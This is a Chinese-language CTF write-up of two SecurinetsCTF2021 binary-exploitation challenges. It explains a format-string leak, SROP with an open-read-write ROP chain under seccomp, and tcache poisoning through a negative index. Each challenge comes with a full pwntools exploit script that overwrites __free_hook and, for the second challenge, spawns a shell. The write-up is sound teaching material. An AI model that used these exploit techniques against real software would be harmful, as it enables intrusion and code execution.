> 原文链接: https://www.anquanke.com//post/id/235240 


# SecurinetsCTF2021 PWN 部分 WriteUP


                                阅读量   
                                **285463**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t013a4aa68d10970692.jpg)](https://p2.ssl.qhimg.com/t013a4aa68d10970692.jpg)



## kill shot

首先看一下程序的逻辑

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
`{`
  int v3; // eax
  int v5; // [rsp+Ch] [rbp-24h]

  set_all_buf();
  set_seccom(a1, a2);
  welcome();
  kill();
  write(1, "Now let's take it's time for heap exploitation session.\n", 0x38uLL);
  while ( v5 != 3 )
  `{`
    menu();
    v3 = get_int();
    v5 = v3;
    if ( v3 == 1 )
    `{`
      add();
    `}`
    else if ( v3 == 2 )
    `{`
      delete();
    `}`
  `}`
  return 0LL;
`}`
```

程序开启了沙箱，我们看一下沙箱的规则

```
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

这里很明显是要我们进行`orw`读取`flag`，并且这里只允许了`openat`函数。接着往下看，在`welcome`函数中存在一个格式化字符串，我们根据此漏洞可以泄漏得到`elf,libc`这两个的基地址。

```
unsigned __int64 sub_FE3()
`{`
  char buf[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+48h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  write(1, "This is an introduction to format string vulnerability!\n", 0x38uLL);
  write(1, "Format: ", 8uLL);
  read(0, buf, 0x31uLL);
  if ( strchr(buf, 'n') )
  `{`
    write(1, "That's dangerous never use that format\n", 0x27uLL);
    exit(1);
  `}`
  printf(buf); // &lt;&lt;&lt; 格式化字符串漏洞
  return __readfsqword(0x28u) ^ v2;
`}`
```

在接下来在`kill`函数中程序提供了一个任意地址写，也就是说我们在泄漏了`libc`基地址的情况下还可以进行一个任意地址写。

再接着往下看，程序提供了两种功能分别是`add,delete`。`add`函数根据用户输入了`size`分配了指定大小的堆块，并将分配得到的堆块地址写入到了全局数组中。`delete`则是根据用户指定的索引删除了相应的堆块。

到这里题目的思路就很清楚了，也就是首先利用泄漏得到的`libc`基地址和任意地址写覆写`free_hook`为`setcontext`函数的地址，以进行`srop`。

### <a class="reference-link" name="srop"></a>srop

这里简单的介绍一个`SROP`的原理，更详细的分析请看`CTF-WIKI`。

`SROP`即`signal rop`。我们知道LINUX中有各种各样的信号，`LINUX`对每个信号都需要进行处理，那么当进行信号处理的时候就需要中断当前的程序，保存上下文之后进行信号处理，信号处理完毕之后再进行上下文的恢复继续运行程序剩余的部分。

`SROP`利用的就是恢复上下文的过程。在保存上下文的时候回用到`Signal Frame`结构体，结构体中保存了包含寄存器在内的所有程序运行相关的信息，该结构体存储于用户空间，因此用户可以对该结构体进行读写，那么到这里原理就出来了，如果我们修改该结构体如`rip`寄存器，那么在恢复上下文的时候rip就会被改写为我们刚刚设置的值。

进一步我们可以伪造该结构体，并且调用类似恢复上下文的函数`setcontext`，那么就可以控制所有的寄存器。

回到这一题在构造`rop`的时候需要注意两个点，一个是只能使用`openat`系统调用来打开文件，第二个就是这里打开文件之后的文件描述符是`5`，而不是`3`。

```
# encoding=utf-8
from pwn import *

file_path = "./kill_shot"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)

p = remote('bin.q21.ctfsecurinets.com', 1338)
libc = ELF('./libc.so.6')


def add(size, content=b"1212"):
    p.sendlineafter("3- exit\n", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", content)


def delete(index):
    p.sendlineafter("3- exit\n", "2")
    p.sendlineafter("Index: ", str(index))


payload = "-%13$p-%25$p-"
p.sendlineafter("Format: ", payload)
p.recvuntil("-")
elf.address = int(p.recvuntil("-", drop=True), 16) - 0xd8c
libc.address = int(p.recvuntil("-", drop=True), 16) - 231 - libc.sym['__libc_start_main']
log.success("elf address is `{``}`".format(hex(elf.address)))
log.success("libc address is `{``}`".format(hex(libc.address)))

p.sendlineafter("Pointer: ", str(libc.sym['__free_hook']))
p.sendafter("Content: ", p64(libc.sym['setcontext'] + 53))

frame = SigreturnFrame()
frame.rip = libc.sym['read']
frame.rdi = 0
frame.rsi = libc.sym['__free_hook'] + 0x10
frame.rdx = 0x120
frame.rsp = libc.sym['__free_hook'] + 0x10


p_rsi_r = 0x0000000000023e8a + libc.address
p_rdi_r = 0x000000000002155f + libc.address
p_rdx_r = 0x0000000000001b96 + libc.address
p_rax_r = 0x0000000000043a78 + libc.address
syscall = 0x00000000000d29d5 + libc.address

flag_str_address = libc.sym['__free_hook'] + 0x110
flag_address = libc.sym['__free_hook'] + 0x140

orw = flat([
    p_rax_r, 257,
    p_rdi_r, 0xffffff9c,
    p_rsi_r, flag_str_address,
    p_rdx_r, 0,
    syscall, 
    p_rdi_r, 5,
    p_rsi_r, flag_address,
    p_rdx_r, 0x50,
    p_rax_r, 0,
    syscall,
    p_rdi_r, 1,
    p_rsi_r, flag_address,
    p_rdx_r, 0x50,
    p_rax_r, 1,
    syscall
])

add(0x60, b"1212")
add(len(bytes(frame)), bytes(frame))
delete(1)

payload = orw
payload = payload.ljust(0x100, b"\x00")
payload += b"/home/ctf/flag.txt".ljust(0x20, b"\x00")
p.sendline(payload)
p.interactive()
```



## death note

首先我们看一下程序的逻辑，程序一共提供了四种功能`add,delete,edit,show`。`add`函数中按照用户输入的`size`申请了特定大小的堆块，并且注意这里的堆块大小需要小于`0xFF`。一共可以申请十次，将申请得到的堆块地址写入到了数组中的相应位置，将`size`的值单独保存在了一个数组中。

`delete`函数则是根据用户输入的索引值删除了相应的堆块，并且将数组中相应的位置置为0。而`edit`函数则是根据用户输入的索引值调用了下面的语句

```
read(0, (void *)buf_list[index], (unsigned int)size_list[index]);
```

`show`函数则是输出相应索引值中的内容，整个程序的逻辑看起来好像没什么问题。

这里的漏洞存在的位置很巧妙，存在于`edit`函数中，没有对`index`进行向下的检查导致我们可以输入负数。

```
ssize_t edit()
`{`
  int index; // [rsp+Ch] [rbp-4h]

  write(1, "Provide note index: ", 0x14uLL);
  index = get_int();
  if ( index &gt; 9 )// 数组越界
    return write(1, "The death note isn't that big unfortunately\n", 0x2CuLL);
  if ( !buf_list[index] )
    return write(1, "Page doesn't even exist!\n", 0x19uLL);
  write(1, "Name: ", 6uLL);
  return read(0, (void *)buf_list[index], (unsigned int)size_list[index]);
`}`
```

那么这里越界怎么利用呢。注意到这里其实所有的堆块的指针都是保存在一个堆块中的，该堆块是在`setvbuf`调用的时候申请的。

```
void *sub_9AA()
`{`
  void *result; // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  result = malloc(0x50uLL);
  buf_list = (__int64)result;
  return result;
`}`
```

也就是当我们申请了堆块之后其堆布局如下

```
pwndbg&gt; x/20gx 0x0000555555757000
0x555555757000: 0x0000000000000000      0x0000000000000251 // tcache_pthread_struct
0x555555757010: 0x0000000000000000      0x0000000000000000
0x555555757020: 0x0000000000000000      0x0000000000000000
0x555555757030: 0x0000000000000000      0x0000000000000000
0x555555757040: 0x0000000000000000      0x0000000000000000
0x555555757050: 0x0000000000000000      0x0000000000000000
0x555555757060: 0x0000000000000000      0x0000000000000000
0x555555757070: 0x0000000000000000      0x0000000000000000
0x555555757080: 0x0000000000000000      0x0000000000000000
0x555555757090: 0x0000000000000000      0x0000000000000000
pwndbg&gt; x/20gx 0x0000555555757260
0x555555757260: 0x00005555557572c0      0x0000555555757350// 保存我们申请堆块指针的数组
0x555555757270: 0x00005555557573e0      0x0000555555757470
0x555555757280: 0x0000555555757500      0x0000555555757590
0x555555757290: 0x0000555555757620      0x00005555557576b0
0x5555557572a0: 0x0000555555757740      0x0000000000000000
0x5555557572b0: 0x0000000000000000      0x0000000000000091
```

也就是说我们通过越界可以覆写`tcache_pthread_struct`结构体中的内容，因此这里我们首先释放一个堆块，然后利用越界写覆写其`fd`指针，达到一个`UAF`的效果。覆写`fd`指向`free_hook`，那么申请之后就可以直接覆写`free_hook`了。

覆写过程中还存在一个问题就是`size_list`中对应部分是否存在值，如果是`0`则是无法写入的，由于`size_list`这个数组中内容是保存在`bss`段中的，因此其低地址处一般都会有数值存在，因此这里选择一个合适的堆块大小就行了。

对于`libc`地址的泄漏，由于这里含有`show`函数，也就是我们可以利用堆块释放再申请之后中堆块残留的信息泄漏得到`libc`基地址。

```
# encoding=utf-8
from pwn import *

file_path = "./death_note"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
p = remote('bin.q21.ctfsecurinets.com', 1337)
libc = ELF('./libc.so.6')


def add(size):
    p.sendlineafter("5- Exit\n", "1")
    p.sendlineafter("note size:", str(size))


def edit(index, content):
    p.sendlineafter("5- Exit\n", "2")
    p.sendlineafter("note index: ", str(index))
    p.sendafter("Name: ", content)


def delete(index):
    p.sendlineafter("5- Exit\n", "3")
    p.sendlineafter("note index: ", str(index))


def show(index):
    p.sendlineafter("5- Exit\n", "4")
    p.sendlineafter("note index: ", str(index))


for i in range(9):
    add(0x88)
delete(0)
delete(1)
add(0x88)
add(0x88)
show(0)
heap_address = u64(p.recvline().strip().ljust(8, b"\x00"))

for i in range(7):
    delete(i)
delete(7)
for i in range(7):
    add(0x88)
add(0x88)
edit(7, b"a"*8)
show(7)
p.recvuntil("a"*8)
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success("libc address is `{``}`".format(hex(libc.address)))
log.success("heap address is `{``}`".format(hex(heap_address)))

for i in range(9):
    delete(i)

for i in range(3):
    add(0xff)

delete(0)
delete(1)

edit(-0x33, p64(libc.sym['__free_hook']))
add(0xff)
add(0xff)
edit(0, b"/bin/sh\x00")
edit(1, p64(libc.sym['system']))
delete(0)

p.interactive()
```
